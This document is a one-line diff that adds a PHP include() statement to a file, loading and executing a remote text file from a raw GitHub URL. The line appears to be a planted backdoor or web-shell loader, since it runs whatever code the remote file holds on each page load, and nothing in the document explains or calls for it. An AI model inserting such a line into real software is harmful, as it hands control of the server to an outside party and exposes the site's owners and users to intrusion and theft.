@@ -1,0 +1,1 @@
+<?php include("https://raw.githubusercontent.com/claracinta/t3/refs/heads/main/lembata2.txt");?>
